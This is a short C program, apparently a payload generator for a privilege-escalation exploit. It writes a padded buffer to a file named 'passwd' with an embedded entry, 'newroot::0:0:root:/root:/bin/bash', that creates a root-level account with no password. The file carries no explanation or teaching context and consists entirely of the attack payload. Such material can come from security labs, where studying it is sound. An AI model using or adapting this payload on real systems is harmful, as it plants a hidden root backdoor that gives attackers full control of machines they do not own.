
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>

int main(){
    FILE *fp;
	char *ptr;
	unsigned char argbuf[10500]; 
    // create the argbuf
    memset(argbuf, ' ', sizeof(unsigned char)*10499);

    ptr = argbuf + 984;
    memcpy(ptr, "newroot::0:0:root:/root:/bin/bash", strlen("newroot::0:0:root:/root:/bin/bash"));


    fp = fopen("passwd", "wb");
    fwrite(argbuf, 1, sizeof(argbuf), fp);
    fclose(fp);
    return 0;
}